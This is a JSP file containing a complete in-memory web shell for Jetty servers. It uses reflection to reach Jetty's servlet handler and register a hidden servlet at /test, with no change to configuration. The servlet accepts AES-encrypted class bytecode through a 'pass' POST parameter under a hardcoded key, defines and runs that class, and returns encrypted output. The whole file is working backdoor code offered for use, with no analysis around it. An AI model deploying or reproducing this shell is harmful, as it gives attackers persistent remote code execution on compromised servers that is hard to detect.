<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%@ page import="java.util.Scanner"%>
<%@ page import="java.io.*"%>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="java.security.NoSuchAlgorithmException" %>
<%@ page import="javax.crypto.NoSuchPaddingException" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.security.InvalidKeyException" %>
<%@ page import="javax.crypto.IllegalBlockSizeException" %>
<%@ page import="javax.crypto.BadPaddingException" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>
<%!
    class ResinServlet extends HttpServlet {
        String xc = "3c6e0b8a9c15224a";
        String pass = "pass";
        String md5 = md5(pass + xc);
        Class payload;

        public  String md5(String s) {
            String ret = null;
            try {
                java.security.MessageDigest m;
                m = java.security.MessageDigest.getInstance("MD5");
                m.update(s.getBytes(), 0, s.length());
                ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
            } catch (Exception e) {
            }
            return ret;
        }

        public  String base64Encode(byte[] bs) throws Exception {
            Class base64;
            String value = null;
            try {
                base64 = Class.forName("java.util.Base64");
                Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
                value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e) {
                try {
                    base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
                } catch (Exception e2) {
                }
            }
            return value;
        }

        public  byte[] base64Decode(String bs) throws Exception {
            Class base64;
            byte[] value = null;
            try {
                base64 = Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e) {
                try {
                    base64 = Class.forName("sun.misc.BASE64Decoder");
                    Object decoder = base64.newInstance();
                    value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
                } catch (Exception e2) {
                }
            }
            return value;
        }

        public byte[] x(byte[] s, boolean m) {
            try {
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
                return c.doFinal(s);
            } catch (Exception e) {
                return null;
            }
        }

        public Class defClass(byte[] classBytes) throws Throwable {
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defMethod.setAccessible(true);
            return (Class) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        }

        @Override
        public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                byte[] data = base64Decode(req.getParameter(pass));
                data = x(data, false);
                if (payload == null) {
                    payload = defClass(data);
                } else {
                    java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                    Object f = payload.newInstance();
                    f.equals(arrOut);
                    f.equals(data);
                    f.equals(req);
                    resp.getWriter().write(md5.substring(0, 16));
                    f.toString();
                    resp.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                    resp.getWriter().write(md5.substring(16));
                }
            } catch (Throwable e) {
            }
        }
    }
%>

<%
    String servletName = "myServlet";
    String urlPattern = "/test";
    Servlet servlet = new ResinServlet();
    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;
    for (Thread thread : threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                fieldServletHandler.setAccessible(true);
                Object servletHandler = fieldServletHandler.get(webAppContext);
                Field fieldServlets = servletHandler.getClass().getDeclaredField("_servlets");
                fieldServlets.setAccessible(true);
                Object[] servlets = (Object[]) fieldServlets.get(servletHandler);
                boolean flag = false;
                for(Object s:servlets){
                    Field fieldName = s.getClass().getSuperclass().getDeclaredField("_name");
                    fieldName.setAccessible(true);
                    String name = (String) fieldName.get(s);
                    if(name.equals(servletName)){
                        flag = true;
                        break;
                    }
                }
                if(flag){
                    out.println("[-] Servlet " + servletName + " exists.<br>");
                    return;
                }
                out.println("[+] Add Servlet: " + servletName + "<br>");
                out.println("[+] urlPattern: " + urlPattern + "<br>");
                ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                Class sourceClazz = null;
                Object holder = null;
                Field field = null;
                try{
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                    field = sourceClazz.getDeclaredField("JAVAX_API");
                    Method method = servletHandler.getClass().getMethod("newServletHolder", sourceClazz);
                    holder = method.invoke(servletHandler, field.get(null));
                }catch(ClassNotFoundException e){
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                    Method method = servletHandler.getClass().getMethod("newServletHolder", sourceClazz);
                    holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                }
                holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);
                holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, servlet);
                servletHandler.getClass().getMethod("addServlet", holder.getClass()).invoke(servletHandler, holder);
                Class clazz = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
                Object servletMapping = null;
                try{
                    servletMapping = clazz.getDeclaredConstructor(sourceClazz).newInstance(field.get(null));
                }catch(NoSuchMethodException e){
                    servletMapping = clazz.newInstance();
                }
                servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
                servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
                servletHandler.getClass().getMethod("addServletMapping", clazz).invoke(servletHandler, servletMapping);
            }
        }
    }
%>